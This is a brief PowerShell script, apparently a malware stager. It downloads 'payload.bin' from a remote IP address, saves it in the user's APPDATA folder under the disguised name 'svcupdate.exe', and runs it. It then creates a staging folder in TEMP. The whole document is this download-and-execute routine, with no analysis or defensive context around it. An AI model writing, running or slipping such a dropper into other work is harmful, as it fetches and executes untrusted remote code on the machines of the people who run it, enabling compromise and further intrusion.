
$RemoteUrl = "http://198.51.100.136:80/payload.bin"
$OutputPath = "$env:APPDATA\svcupdate.exe"
(New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $OutputPath)
Start-Process -FilePath $OutputPath
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
